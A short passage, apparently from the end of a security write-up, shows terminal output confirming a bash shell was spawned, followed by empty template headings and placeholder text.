    uid=1000(nothing) gid=1000(nothing) groups=1000(nothing),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),113(kaboxer)
    $ echo $0
    /bin/bash
    

and we succeeded ! It managed to spawn the bash shell like we wanted.

## Title 

text 
    
    
    

` ![]()

## Title 

text 
    
    
    

` ![]()

